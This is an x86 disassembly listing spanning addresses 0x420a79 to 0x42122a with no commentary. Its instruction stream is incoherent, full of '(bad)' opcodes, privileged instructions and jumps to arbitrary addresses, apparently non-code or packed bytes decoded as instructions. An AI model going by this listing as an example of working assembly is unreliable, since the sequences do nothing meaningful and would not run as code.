  420a79:	je     0x420a80
  420a7b:	aad    0x79
  420a7d:	add    al,0x5d
  420a7f:	clc    
  420a80:	and    eax,0xdea07c0f
  420a85:	lds    ebx,FWORD PTR [edx]
  420a87:	adc    dl,dh
  420a89:	test   al,0x6e
  420a8b:	sub    DWORD PTR [edi+0x30],esi
  420a8e:	scas   eax,DWORD PTR es:[edi]
  420a8f:	aas    
  420a90:	adc    BYTE PTR [eax-0x8a97375],al
  420a96:	das    
  420a97:	push   0x3a203c9
  420a9c:	mov    al,0x35
  420a9e:	(bad)  
  420a9f:	adc    BYTE PTR [eax+edx*4],ah
  420aa2:	xchg   DWORD PTR [eax+edi*2],ebx
  420aa5:	xchg   esi,eax
  420aa6:	adc    al,dh
  420aa8:	cmp    ah,BYTE PTR [ecx+0x5c]
  420aab:	fbstp  TBYTE PTR [edi+0x212d10e9]
  420ab1:	sub    al,0x38
  420ab3:	mov    al,gs:0xefa5c390
  420ab9:	mov    bl,0xe8
  420abb:	or     edi,DWORD PTR [ecx+ebp*2]
  420abe:	lock adc cl,dh
  420ac1:	push   ds
  420ac2:	add    al,0x25
  420ac4:	pop    ss
  420ac5:	mov    ch,0x5
  420ac7:	sbb    DWORD PTR [esp+ebp*1],ecx
  420aca:	and    al,0x7a
  420acc:	nop
  420acd:	(bad)  
  420ace:	fndisi(8087 only) 
  420ad0:	adc    BYTE PTR [ebp+0x10],ch
  420ad3:	lea    ecx,[esi]
  420ad5:	(bad)  
  420ad6:	mov    eax,0x33ee001b
  420adb:	das    
  420adc:	sub    ah,BYTE PTR [edx]
  420ade:	aam    0xbc
  420ae0:	or     BYTE PTR [edx+0x59],dl
  420ae3:	jg     0x420b0c
  420ae5:	jae    0x420af8
  420ae7:	push   cs
  420ae8:	and    BYTE PTR [edi+eax*4],dh
  420aeb:	inc    ebp
  420aec:	(bad)  
  420aed:	cmp    esp,DWORD PTR [eax]
  420aef:	js     0x420b36
  420af1:	or     edi,DWORD PTR [ebx]
  420af3:	in     eax,0x7a
  420af5:	adc    DWORD PTR [ebx],edx
  420af7:	pushf  
  420af8:	cwde   
  420af9:	ret    0xffb4
  420afc:	std    
  420afd:	xor    al,0x12
  420aff:	xchg   ebx,eax
  420b00:	mov    ebx,0x17ce9185
  420b05:	adc    al,BYTE PTR [ecx-0x80]
  420b08:	fld    QWORD PTR [ecx+0x404cc715]
  420b0e:	jmp    0x420b49
  420b10:	fdiv   st,st(6)
  420b12:	stos   DWORD PTR es:[edi],eax
  420b13:	mov    ah,0x82
  420b15:	scas   al,BYTE PTR es:[edi]
  420b16:	mov    dl,BYTE PTR [ebx]
  420b18:	jbe    0x420b24
  420b1a:	sub    dl,0xa
  420b1d:	je     0x420b24
  420b1f:	or     BYTE PTR [ebx],al
  420b21:	jno    0x420b44
  420b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b24:	add    esp,DWORD PTR [eax]
  420b26:	retf   
  420b27:	sub    ecx,eax
  420b29:	int3   
  420b2a:	fldcw  WORD PTR [edi+0x23925518]
  420b30:	std    
  420b31:	cmp    BYTE PTR [ebx],0xd
  420b34:	jne    0x420b90
  420b36:	nop
  420b37:	inc    edi
  420b38:	hlt    
  420b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b3a:	or     cl,BYTE PTR [edx]
  420b3c:	add    BYTE PTR [ebp-0x3e],dh
  420b3f:	int    0x1e
  420b41:	adc    ah,bl
  420b43:	sub    BYTE PTR ds:0xc9123baf,ah
  420b49:	pushf  
  420b4a:	mov    BYTE PTR [esi+0x71],bl
  420b4d:	dec    edi
  420b4e:	mov    edx,0xb4156512
  420b53:	add    eax,0x3de034cc
  420b58:	pop    ds
  420b59:	pushf  
  420b5a:	jo     0x420ae4
  420b5c:	inc    esi
  420b5d:	mov    BYTE PTR [ebx+0x63],ah
  420b60:	push   ss
  420b61:	pop    esp
  420b62:	sbb    al,0x6a
  420b64:	fcomp  QWORD PTR [edx]
  420b66:	push   edx
  420b67:	in     al,0x6b
  420b69:	mov    esp,0x7112c1ed
  420b6e:	sub    DWORD PTR cs:[ebp+edi*1-0x7e0083a4],eax
  420b76:	out    0x9f,al
  420b78:	iret   
  420b79:	test   BYTE PTR [ebx+0x4],0x4
  420b7d:	cmp    eax,0x438ae841
  420b82:	pop    es
  420b83:	jle    0x420b84
  420b85:	jo     0x420bc9
  420b87:	aaa    
  420b88:	cmp    bl,BYTE PTR [esi+0x7]
  420b8b:	jne    0x420b93
  420b8d:	test   BYTE PTR [esi+0x3e],0x7
  420b91:	or     BYTE PTR [esi+0x38],0x18
  420b95:	fs (bad) 
  420b97:	or     cl,BYTE PTR [eax-0x3f387de4]
  420b9d:	xor    eax,0x1603135d
  420ba2:	add    al,0x24
  420ba4:	movaps xmm5,XMMWORD PTR [ecx+ecx*8]
  420ba8:	stos   BYTE PTR es:[edi],al
  420ba9:	cmp    BYTE PTR [esi],al
  420bab:	aad    0xf5
  420bad:	mov    dh,0x46
  420baf:	adc    al,0xa
  420bb1:	in     al,dx
  420bb2:	jecxz  0x420be4
  420bb4:	adc    ah,bl
  420bb6:	inc    esi
  420bb7:	or     BYTE PTR [esi-0x1d6ecb09],bl
  420bbd:	in     eax,dx
  420bbe:	sub    edx,DWORD PTR [esp+edx*1+0x46]
  420bc2:	mov    ch,0x28
  420bc4:	aam    0xca
  420bc6:	adc    BYTE PTR [edx],ch
  420bc8:	pop    ds
  420bc9:	cs ret 
  420bcb:	cmp    al,0x60
  420bcd:	dec    edx
  420bce:	adc    DWORD PTR [ebx],ebp
  420bd0:	aaa    
  420bd1:	icebp  
  420bd2:	add    BYTE PTR [eax-0x20],0x63
  420bd6:	or     DWORD PTR [edx],edx
  420bd8:	lock adc al,0x29
  420bdb:	or     al,0x11
  420bdd:	icebp  
  420bde:	push   ss
  420bdf:	sub    edx,DWORD PTR cs:[ebp-0x42a3eaf7]
  420be6:	mov    WORD PTR [edx],?
  420be8:	sbb    al,0x68
  420bea:	sbb    eax,0x54256a54
  420bef:	mov    ds:0xeb029e26,al
  420bf4:	div    al
  420bf6:	loop   0x420c1f
  420bf8:	dec    esi
  420bf9:	sub    eax,0xf9c8909a
  420bfe:	sbb    al,0x1
  420c00:	inc    ebx
  420c01:	adc    DWORD PTR [edi],esp
  420c03:	fs mov esi,0xf1963810
  420c09:	retf   0x8893
  420c0c:	fwait
  420c0d:	push   0x3f
  420c0f:	adc    BYTE PTR [ecx],0xd7
  420c12:	inc    ecx
  420c13:	data16 or al,0x22
  420c16:	pop    edx
  420c17:	push   ebx
  420c18:	mov    esi,DWORD PTR [eax]
  420c1a:	add    DWORD PTR [eax+ecx*8+0x24],0xfffffffe
  420c1f:	and    BYTE PTR [edi+eax*4],dh
  420c22:	sbb    al,0x5b
  420c24:	aaa    
  420c25:	sub    ch,BYTE PTR [eax+ebp*1]
  420c28:	pop    ebx
  420c29:	mov    al,ds:0x1419b4e9
  420c2e:	xor    edi,DWORD PTR [ebp+0x16088492]
  420c34:	shl    BYTE PTR [eax-0x53],cl
  420c37:	cmp    al,0x4b
  420c39:	adc    al,0xd3
  420c3b:	popf   
  420c3c:	fst    DWORD PTR [edx-0x67]
  420c3f:	inc    ebx
  420c40:	ret    
  420c41:	push   ecx
  420c42:	and    BYTE PTR [eax],0xc9
  420c45:	push   esp
  420c46:	jmp    0x420cc7
  420c48:	pop    ss
  420c49:	adc    al,0xfb
  420c4b:	nop
  420c4c:	setbe  BYTE PTR [ebp-0x57]
  420c50:	lea    eax,[eax+esi*8]
  420c53:	ss jo  0x420c55
  420c56:	(bad)  
  420c57:	in     eax,dx
  420c58:	mov    es,WORD PTR [eax]
  420c5a:	mov    al,0xaa
  420c5c:	adc    eax,0xf0144303
  420c61:	add    eax,0xbdc476b
  420c66:	inc    esp
  420c67:	lock or BYTE PTR [eax],al
  420c6a:	rol    edi,cl
  420c6c:	add    DWORD PTR [ebx],0x6d
  420c6f:	lea    esp,[ebx*8+0x230cff85]
  420c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c77:	fs xchg edx,eax
  420c79:	jnp    0x420c4a
  420c7b:	in     eax,0x95
  420c7d:	mov    BYTE PTR [edi+esi*1],ah
  420c80:	mov    edx,0x3f100501
  420c85:	push   eax
  420c86:	or     al,0xaa
  420c88:	out    dx,al
  420c89:	pop    eax
  420c8a:	cld    
  420c8b:	lock inc eax
  420c8d:	dec    esp
  420c8e:	shr    BYTE PTR [ebp+0x486e009d],1
  420c94:	sbb    BYTE PTR [ecx+0x44a341a],cl
  420c9a:	and    ecx,esp
  420c9c:	arpl   bx,bx
  420c9e:	or     BYTE PTR [ecx+0x448045a],cl
  420ca4:	pop    edi
  420ca5:	cmp    al,0x6d
  420ca7:	sub    BYTE PTR [eax-0x69],dh
  420caa:	or     BYTE PTR [ebp-0x70],0xae
  420cae:	xor    BYTE PTR [edi],0x99
  420cb1:	fiadd  DWORD PTR [edi+0x14]
  420cb4:	dec    eax
  420cb5:	mov    bl,0xb7
  420cb7:	mov    bh,0xc7
  420cb9:	sub    BYTE PTR [ebx],bh
  420cbb:	je     0x420cc3
  420cbd:	jg     0x420cfe
  420cbf:	mov    ebx,DWORD PTR [edx+ecx*1+0x3]
  420cc3:	(bad)  
  420cc5:	jmp    0x420cf1
  420cc7:	ret    0xd117
  420cca:	add    DWORD PTR [ebx+0x14],eax
  420ccd:	aam    0x12
  420ccf:	(bad)  
  420cd0:	in     al,dx
  420cd1:	cs dec eax
  420cd3:	fild   WORD PTR [ebp-0x72fa821a]
  420cd9:	jae    0x420cdc
  420cdb:	ds aad 0x35
  420cde:	dec    ecx
  420cdf:	not    bl
  420ce1:	dec    edx
  420ce2:	mov    DWORD PTR [esi+eax*2-0x1e],edx
  420ce6:	or     eax,0x88ae0181
  420ceb:	inc    esp
  420cec:	add    esp,DWORD PTR [ecx+eax*1+0x4c]
  420cf0:	repz jge 0x420c77
  420cf3:	mov    ebx,0xc17e8d81
  420cf8:	mov    DWORD PTR [eax],esi
  420cfa:	mov    dh,BYTE PTR [eax]
  420cfc:	push   eax
  420cfd:	shl    DWORD PTR [ecx+0x37],0xcb
  420d01:	(bad)  
  420d02:	out    dx,eax
  420d03:	add    eax,ebp
  420d05:	lea    eax,[eax-0x230d25e2]
  420d0b:	sbb    cl,BYTE PTR [eax]
  420d0d:	pop    eax
  420d0e:	shl    DWORD PTR [edi+0x14400a18],1
  420d14:	ret    
  420d15:	mov    al,ds:0x3f545869
  420d1a:	fimul  DWORD PTR [ebx-0xd0643fc]
  420d20:	push   es
  420d21:	pop    eax
  420d22:	push   esi
  420d23:	mov    edx,DWORD PTR [eax+0x18]
  420d26:	repnz test esi,esi
  420d29:	mov    BYTE PTR [ebx],0xc1
  420d2c:	(bad)  
  420d2d:	pop    ds
  420d2e:	dec    ebp
  420d2f:	mov    ecx,0x9abebe9c
  420d34:	(bad)  
  420d35:	or     eax,0x8087d10c
  420d3a:	pop    esi
  420d3b:	iret   
  420d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d3d:	push   cs
  420d3e:	lea    ecx,es:[esi+0x0]
  420d42:	sub    ebx,edi
  420d44:	in     al,0xb3
  420d46:	sbb    DWORD PTR [eax],ecx
  420d48:	dec    eax
  420d49:	sbb    al,0x8d
  420d4b:	push   eax
  420d4c:	mov    bl,0xbf
  420d4e:	adc    ecx,DWORD PTR [esi]
  420d50:	icebp  
  420d51:	xor    al,0xf7
  420d53:	test   al,0x0
  420d55:	or     eax,0x223c16cd
  420d5a:	das    
  420d5b:	int    0xa1
  420d5d:	je     0x420d28
  420d5f:	add    eax,0x44fa1e4b
  420d64:	push   edi
  420d65:	test   DWORD PTR [esi-0x7a],edi
  420d68:	jns    0x420dc5
  420d6a:	sbb    BYTE PTR [ecx-0x496e7725],bl
  420d70:	adc    DWORD PTR [ecx],ebp
  420d72:	popf   
  420d73:	ja     0x420d1c
  420d75:	aas    
  420d76:	add    al,0x3f
  420d78:	(bad)  
  420d79:	add    eax,0x201843ea
  420d7e:	or     eax,0x61fee006
  420d83:	mov    ds:0x801d0910,al
  420d88:	lea    edx,[edx+esi*8+0x8]
  420d8c:	push   edx
  420d8d:	bt     DWORD PTR [edi+eax*4-0x38],eax
  420d92:	nop
  420d93:	and    eax,0x79115ac2
  420d98:	loopne 0x420dbb
  420d9a:	(bad)  [edi-0x6d21f9b5]
  420da0:	jmp    0x420d52
  420da2:	xchg   BYTE PTR [ebx-0x5f],ch
  420da5:	(bad)  
  420da7:	jl     0x420d3a
  420da9:	push   0x5a
  420dab:	adc    eax,0x5791f364
  420db0:	sub    esi,DWORD PTR ds:0xbbc1b6d8
  420db6:	xchg   DWORD PTR [eax-0x1ab3ef1e],ebx
  420dbc:	mov    DWORD PTR [eax+edi*4-0x7f],edi
  420dc0:	inc    esi
  420dc1:	call   0xa9c99f5c
  420dc6:	pop    edi
  420dc7:	loopne 0x420d51
  420dc9:	cwde   
  420dca:	jne    0x420dd0
  420dcc:	add    eax,DWORD PTR [ebp-0xc]
  420dcf:	ror    DWORD PTR [esi],1
  420dd1:	mov    ebp,0x3e38080d
  420dd6:	mov    edx,DWORD PTR [ebp+0x6cd146a7]
  420ddc:	or     BYTE PTR [edx],dl
  420dde:	and    cl,BYTE PTR [esi-0x2a]
  420de1:	mov    ebx,0x7f20d24d
  420de6:	(bad)  
  420de7:	jl     0x420e09
  420de9:	loop   0x420e32
  420deb:	mov    ebp,0x9793c6c3
  420df0:	mov    esp,0x75890575
  420df5:	in     eax,dx
  420df6:	xchg   DWORD PTR [ebp+0x3b0852b6],ecx
  420dfc:	or     BYTE PTR [ebp-0x30],dh
  420dff:	inc    ebx
  420e00:	dec    esi
  420e01:	inc    esi
  420e02:	jge    0x420e5d
  420e04:	adc    DWORD PTR es:[edi+0x7ef81ab7],esi
  420e0b:	adc    DWORD PTR [ebx-0x26],esp
  420e0e:	es jo  0x420e44
  420e11:	fwait
  420e12:	pop    ebx
  420e13:	pop    es
  420e14:	jmp    0x7f85:0x7cf460e4
  420e1b:	add    dl,BYTE PTR [edx]
  420e1d:	in     eax,dx
  420e1e:	mov    ch,0x47
  420e20:	and    al,0x3
  420e22:	lea    eax,[ebx+0x10]
  420e25:	push   eax
  420e26:	test   BYTE PTR [ebx+eiz*1+0x18],dl
  420e2a:	out    0xc2,eax
  420e2c:	or     DWORD PTR [ebp-0x5ebdf72d],edx
  420e32:	xchg   ecx,eax
  420e33:	daa    
  420e34:	pop    esi
  420e35:	clc    
  420e36:	pop    eax
  420e37:	mov    ecx,0xbcbb8a6
  420e3c:	push   0xffffff88
  420e3e:	xor    al,0x47
  420e40:	mov    eax,cs:0x40c4b6c1
  420e46:	cmp    BYTE PTR [ecx-0x48bb8ff1],dl
  420e4c:	xchg   esp,eax
  420e4d:	inc    edi
  420e4e:	push   esi
  420e4f:	cmp    eax,0x7e01c828
  420e54:	add    esi,DWORD PTR [ecx+ebx*2-0x6e]
  420e58:	and    dh,BYTE PTR [esi+edi*8]
  420e5b:	dec    ecx
  420e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e5d:	and    BYTE PTR [esi+ebp*4],cl
  420e60:	add    esp,DWORD PTR [ebx]
  420e62:	ror    esp,cl
  420e64:	add    DWORD PTR [ebx],0x4e1eb61a
  420e6a:	mov    ebx,0x42a4044
  420e6f:	push   cs
  420e70:	iret   
  420e71:	jo     0x420e00
  420e73:	adc    DWORD PTR ds:[edx+0x34],edi
  420e77:	cmc    
  420e78:	sbb    dh,dl
  420e7a:	mov    esi,DWORD PTR [edi+0x43]
  420e7d:	pop    edx
  420e7e:	xchg   esi,eax
  420e7f:	xor    eax,0x563e5a59
  420e84:	fxch   st(5)
  420e86:	push   cs
  420e87:	mov    edx,0x49c345e6
  420e8c:	cwde   
  420e8d:	jmp    0x229:0xe3acf936
  420e94:	jae    0x420e95
  420e96:	aad    0x76
  420e98:	add    ebx,esp
  420e9a:	call   0x955ac9a6
  420e9f:	clc    
  420ea0:	dec    ecx
  420ea1:	mov    eax,edx
  420ea3:	mov    DWORD PTR [edi],ebp
  420ea5:	adc    al,0x83
  420ea7:	jge    0x420ea0
  420ea9:	aas    
  420eaa:	or     DWORD PTR [edi-0x62],esi
  420ead:	or     eax,DWORD PTR [ecx+0x7280b07d]
  420eb3:	pop    ss
  420eb4:	jmp    0x420eb8
  420eb6:	jl     0x420ecb
  420eb8:	and    al,0xb1
  420eba:	jge    0x420eee
  420ebc:	xchg   esi,eax
  420ebd:	add    BYTE PTR [esi+esi*2+0x1b],ch
  420ec1:	and    al,0x7e
  420ec3:	pop    ss
  420ec4:	(bad)  
  420ec6:	inc    eax
  420ec7:	aaa    
  420ec8:	call   0x62568425
  420ecd:	jne    0x420ee4
  420ecf:	cmp    BYTE PTR [esp+edi*8],ch
  420ed2:	loopne 0x420e95
  420ed4:	mov    ebx,0xd8523304
  420ed9:	and    eax,0x558d0ff7
  420ede:	inc    esi
  420edf:	bound  edi,QWORD PTR [ecx+0x190b0b95]
  420ee5:	adc    bh,BYTE PTR [edx+0x4c]
  420ee8:	mov    ecx,0x5044725
  420eed:	jo     0x420e93
  420eef:	pop    ebp
  420ef0:	or     DWORD PTR [esi+0x23f18834],ebp
  420ef6:	mov    cl,0x4a
  420ef8:	push   edi
  420ef9:	pop    edx
  420efa:	xlat   BYTE PTR ds:[ebx]
  420efb:	pop    ss
  420efc:	jnp    0x420f4f
  420efe:	test   al,0x0
  420f00:	sub    al,0xe6
  420f02:	dec    edi
  420f03:	lea    ebx,[ebp+0x3]
  420f06:	fadd   DWORD PTR [edi-0x5f6c1f73]
  420f0c:	push   es
  420f0d:	mov    ds:0x9e1e2530,al
  420f12:	iret   
  420f13:	sub    al,0xa0
  420f15:	hlt    
  420f16:	add    DWORD PTR [eax+0x40],ebp
  420f19:	or     ecx,eax
  420f1b:	dec    esp
  420f1c:	out    dx,al
  420f1d:	mov    ds:0xa213db0,eax
  420f22:	sbb    bh,BYTE PTR [ebx]
  420f24:	add    eax,0x1ce87506
  420f29:	inc    eax
  420f2a:	loop   0x420f63
  420f2c:	stos   BYTE PTR es:[edi],al
  420f2d:	and    BYTE PTR [ebp-0x52],dl
  420f30:	cld    
  420f31:	pop    ecx
  420f32:	popfw  
  420f34:	cli    
  420f35:	dec    esp
  420f36:	loopne 0x420f68
  420f38:	jne    0x420f22
  420f3a:	sub    al,0x3b
  420f3c:	or     dh,BYTE PTR [ebx]
  420f3e:	pop    edx
  420f3f:	(bad)  
  420f40:	fbstp  TBYTE PTR [eax+ebp*8]
  420f43:	cdq    
  420f44:	push   edx
  420f45:	push   eax
  420f46:	mov    dl,BYTE PTR [ebp-0x1a]
  420f49:	(bad)  
  420f4a:	jo     0x420ed1
  420f4c:	adc    DWORD PTR [edx],0x34d3f82f
  420f52:	ror    DWORD PTR [eax-0x2b],1
  420f55:	push   ebp
  420f56:	dec    esi
  420f57:	retf   
  420f58:	sbb    cl,ch
  420f5a:	jo     0x420f5e
  420f5c:	das    
  420f5d:	adc    al,0x99
  420f5f:	push   cs
  420f60:	dec    edx
  420f61:	and    BYTE PTR [eax+esi*1],ch
  420f64:	xchg   edx,eax
  420f65:	ret    
  420f66:	fisub  WORD PTR [ebx+0x9]
  420f69:	sub    BYTE PTR [ebx+eax*8+0x60],bl
  420f6d:	xchg   ebx,eax
  420f6e:	lock mov eax,ds:0xac5c9653
  420f74:	adc    ah,dl
  420f76:	push   ebp
  420f77:	inc    eax
  420f78:	pop    esi
  420f79:	ds mov dl,0x68
  420f7c:	push   edi
  420f7d:	test   al,0xf3
  420f7f:	ja     0x420f05
  420f81:	aad    0x5
  420f83:	popa   
  420f84:	sub    DWORD PTR [ecx],0xb38be122
  420f8a:	mov    DWORD PTR [edi+0x4],esi
  420f8d:	inc    ebp
  420f8e:	adc    eax,DWORD PTR [ecx+0x6153023f]
  420f94:	dec    eax
  420f95:	cmp    DWORD PTR [eax+ecx*8+0x72002130],0x1f
  420f9d:	je     0x420f7a
  420f9f:	push   edi
  420fa0:	add    al,0x22
  420fa2:	ja     0x420f27
  420fa4:	loop   0x421025
  420fa6:	cmp    eax,0x82041213
  420fab:	mov    al,ds:0x8f8e7d81
  420fb0:	add    DWORD PTR [ebx],0xffffffba
  420fb3:	out    dx,al
  420fb4:	aam    0x98
  420fb6:	sub    al,0x85
  420fb8:	pop    eax
  420fb9:	sbb    cl,BYTE PTR [eax]
  420fbb:	xor    al,0xff
  420fbd:	(bad)  
  420fbe:	xor    al,0x52
  420fc0:	xchg   esp,eax
  420fc1:	jg     0x420fdc
  420fc3:	fnstenv [esi-0x7e]
  420fc6:	clc    
  420fc7:	test   al,0x4a
  420fc9:	sbb    al,0xa5
  420fcb:	hlt    
  420fcc:	xlat   BYTE PTR ds:[ebx]
  420fcd:	(bad)  
  420fce:	loope  0x420fb8
  420fd0:	add    al,0x65
  420fd2:	data16 jo 0x421025
  420fd5:	pushf  
  420fd6:	ror    BYTE PTR [ecx+0x7c0c5180],0x3b
  420fdd:	push   esp
  420fde:	adc    BYTE PTR [edx+eax*2-0x65eb8825],ch
  420fe5:	jbe    0x420faf
  420fe7:	(bad)  
  420fe9:	add    al,0xe8
  420feb:	in     al,0x87
  420fed:	or     BYTE PTR [ebp+0x60],ah
  420ff0:	fcomip st,st(1)
  420ff2:	into   
  420ff3:	mov    bh,0x34
  420ff5:	stc    
  420ff6:	or     DWORD PTR [eax+0x34961da9],ebp
  420ffc:	cmp    BYTE PTR [edx+0x69750036],ah
  421002:	dec    esp
  421003:	mov    cl,0x40
  421006:	inc    ebx
  421007:	sbb    ebp,DWORD PTR [esi+0xb899012]
  42100d:	adc    al,0x7b
  42100f:	add    al,0xde
  421011:	pusha  
  421012:	cdq    
  421013:	sub    cl,BYTE PTR [eax]
  421015:	lods   eax,DWORD PTR ds:[esi]
  421016:	fbld   TBYTE PTR [edx-0x50]
  421019:	or     BYTE PTR [eax+0x41],bl
  42101c:	push   eax
  42101d:	mov    ebx,0x9c145fcc
  421022:	std    
  421023:	xchg   edi,eax
  421024:	mov    bl,BYTE PTR [eax+eax*8]
  421027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421028:	pop    es
  421029:	adc    BYTE PTR [ebx],al
  42102b:	or     ecx,DWORD PTR [eax+0x2fa27203]
  421031:	jmp    0xec3454fb
  421036:	or     ebx,ecx
  421038:	popf   
  421039:	lea    esp,[ebx+0x2]
  42103c:	shl    DWORD PTR [eax-0x3c],1
  42103f:	cdq    
  421040:	nop
  421041:	inc    ebx
  421042:	fidivr DWORD PTR [ebp+0x48]
  421045:	enter  0xe0e0,0xdc
  421049:	nop
  42104a:	retf   
  42104b:	or     edi,DWORD PTR [ecx]
  42104d:	fdivr  QWORD PTR [eax+0x56]
  421050:	mov    al,ds:0x34b30f34
  421055:	fnsave [eax-0x5323bee3]
  42105b:	cmp    BYTE PTR [ebp+0x4a06991],al
  421061:	push   cs
  421062:	sub    al,0x9
  421064:	inc    DWORD PTR [edx]
  421066:	sbb    eax,0x446f02a
  42106b:	push   0x5
  42106d:	cmp    eax,0x185355d8
  421072:	jno    0x42107d
  421074:	iret   
  421075:	sub    BYTE PTR [edi+eiz*1],bh
  421078:	lea    ebx,[ebx+0x63685c3d]
  42107e:	shl    BYTE PTR ds:0xa18689ad,0x17
  421085:	inc    edi
  421086:	or     al,0xb2
  421088:	sbb    ah,BYTE PTR [ebx]
  42108a:	inc    esp
  42108b:	scas   al,BYTE PTR es:[edi]
  42108c:	mov    ds:0x1a725f1e,eax
  421091:	js     0x4210bb
  421093:	push   ebp
  421094:	inc    esp
  421095:	popa   
  421096:	mov    eax,ds:0x52143021
  42109b:	std    
  42109c:	or     BYTE PTR [edi+ebp*2-0x569b5e6],dh
  4210a3:	and    eax,0x3c24f81a
  4210a8:	dec    esp
  4210a9:	and    ebp,esp
  4210ab:	and    dh,ch
  4210ad:	lea    eax,[ebx+0x10e1ddb0]
  4210b3:	pop    ebx
  4210b4:	dec    esi
  4210b5:	mov    cl,0x1b
  4210b7:	in     al,0x88
  4210b9:	sub    edi,DWORD PTR [edx+ebp*4+0x584ae7be]
  4210c0:	data16 rol ah,cl
  4210c3:	stos   DWORD PTR es:[edi],eax
  4210c4:	out    dx,al
  4210c5:	mov    eax,ds:0xa7ac11e0
  4210ca:	dec    ebp
  4210cb:	je     0x421138
  4210cd:	inc    ebp
  4210ce:	or     dl,BYTE PTR [esi+0x1f2bc90c]
  4210d4:	sub    DWORD PTR [eax],edi
  4210d6:	add    al,0xf
  4210d8:	cdq    
  4210d9:	and    BYTE PTR [eax+0xf],dl
  4210dc:	xlat   BYTE PTR ds:[ebx]
  4210dd:	xor    bl,BYTE PTR [edi]
  4210df:	cmp    DWORD PTR [edx],edx
  4210e1:	or     BYTE PTR [ecx],ah
  4210e3:	jg     0x4210f1
  4210e5:	add    edi,DWORD PTR [ecx+0x50b4d652]
  4210eb:	xchg   esp,eax
  4210ec:	sbb    ecx,DWORD PTR [edi+0x5a]
  4210ef:	sub    DWORD PTR [eax-0x48cb3f1c],esp
  4210f5:	push   ebx
  4210f6:	push   DWORD PTR [edi+ebx*8+0x3a14120f]
  4210fd:	fmul   st,st(6)
  4210ff:	dec    esi
  421100:	adc    BYTE PTR [ebx],bl
  421102:	outs   dx,DWORD PTR ds:[esi]
  421103:	mov    BYTE PTR [edi+0x432413ee],ch
  421109:	dec    esp
  42110a:	cldemote BYTE PTR [ecx+0x53]
  42110e:	loopne 0x4210c1
  421110:	mov    DWORD PTR [esp+eax*4+0x27d64bff],eax
  421117:	test   bl,al
  421119:	ror    BYTE PTR [ebx+0x1d],1
  42111c:	into   
  42111d:	out    dx,al
  42111e:	in     eax,dx
  42111f:	call   FWORD PTR [edx-0x397634f2]
  421125:	jmp    0x42115d
  421127:	mov    ecx,DWORD PTR [esi+0x14]
  42112a:	sub    ecx,DWORD PTR [eax-0xf76f589]
  421130:	sub    DWORD PTR [esp+edi*1],0xfffffffc
  421134:	mov    edi,0xd9391cec
  421139:	jb     0x42113d
  42113b:	mov    ecx,ebx
  42113d:	push   esi
  42113e:	sub    ebx,ecx
  421140:	loop   0x421145
  421142:	je     0x4210d7
  421144:	fmul   DWORD PTR [esp+esi*4+0x3a]
  421148:	dec    esi
  421149:	mov    edx,ecx
  42114b:	inc    eax
  42114c:	cld    
  42114d:	loope  0x4211a6
  42114f:	mov    edx,0x5ed14249
  421154:	or     ebx,ebx
  421156:	jne    0x42111e
  421158:	pop    ebx
  421159:	ds inc edx
  42115b:	ret    
  42115c:	add    BYTE PTR [edi],cl
  42115e:	fcomp  DWORD PTR [esi]
  421160:	dec    ebx
  421161:	or     al,0xa
  421163:	mov    BYTE PTR [edi-0x53],ah
  421166:	mov    al,ds:0x38142887
  42116b:	inc    ebp
  42116c:	or     eax,0xf0177e36
  421171:	or     al,0x9e
  421173:	mov    eax,0xe2a728c6
  421178:	adc    BYTE PTR [edi+0x6740def1],cl
  42117e:	xor    al,0xe9
  421180:	pop    eax
  421181:	push   edx
  421182:	sysret 
  421184:	adc    DWORD PTR [ecx+0x34],esp
  421187:	(bad)  
  421188:	or     eax,0xdd1a6f02
  42118d:	ret    
  42118e:	sub    esp,DWORD PTR [eax-0x627e4e4c]
  421194:	jb     0x42111a
  421196:	pop    ss
  421197:	fwait
  421198:	and    eax,0x84a03bb6
  42119d:	xchg   edx,eax
  42119e:	sub    al,0x45
  4211a0:	call   0xaa03b674
  4211a5:	out    dx,eax
  4211a6:	fwait
  4211a7:	and    eax,0x94a4121
  4211ac:	iret   
  4211ad:	and    dl,BYTE PTR [ebx-0x70]
  4211b0:	sub    al,0x12
  4211b2:	or     al,0xbd
  4211b4:	lock sub edx,esp
  4211b7:	add    dh,BYTE PTR [ebp-0x6c]
  4211ba:	clc    
  4211bb:	and    edx,DWORD PTR [ecx]
  4211bd:	xor    BYTE PTR [edx+edi*2+0x8],dh
  4211c1:	js     0x4211eb
  4211c3:	sub    ebx,0xe970fc09
  4211c9:	neg    DWORD PTR [ebx]
  4211cb:	push   ebx
  4211cc:	sub    al,0x6
  4211ce:	je     0x4211d6
  4211d0:	push   es
  4211d1:	adc    ebp,ebx
  4211d3:	and    bh,BYTE PTR [eax]
  4211d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211d6:	sbb    eax,0xe1f3935
  4211db:	and    BYTE PTR [eax+edx*1],al
  4211de:	sar    DWORD PTR [eax-0x48],cl
  4211e1:	add    eax,0xe7accbf9
  4211e6:	lods   eax,DWORD PTR ds:[esi]
  4211e7:	scas   al,BYTE PTR es:[edi]
  4211e8:	mov    esi,0xb0391b16
  4211ed:	xchg   edx,eax
  4211ee:	xchg   ebx,eax
  4211ef:	inc    ebx
  4211f0:	cvttps2pi mm4,QWORD PTR [ecx]
  4211f3:	xor    dl,BYTE PTR [esp+edi*4]
  4211f6:	lods   eax,DWORD PTR cs:[esi]
  4211f8:	jle    0x421209
  4211fa:	or     esp,DWORD PTR [edx]
  4211fc:	jae    0x4211a3
  4211fe:	xchg   esi,eax
  4211ff:	retf   0x633
  421202:	push   es
  421203:	hlt    
  421204:	pop    es
  421205:	pop    es
  421206:	rcl    DWORD PTR [eax+edx*8+0x127377ab],0x8
  42120e:	push   ss
  42120f:	sar    DWORD PTR [edi],0x2
  421212:	je     0x42123f
  421214:	jmp    0x421272
  421216:	push   ecx
  421217:	inc    ebx
  421218:	pop    ss
  421219:	or     al,0x7e
  42121b:	imul   esi,DWORD PTR [esp+esi*1],0x3
  42121f:	leave  
  421220:	dec    esp
  421221:	cmp    DWORD PTR [eax],0x62c18230
  421227:	push   ecx
  421228:	dec    esi
  421229:	xchg   edi,eax
  42122a:	push   es
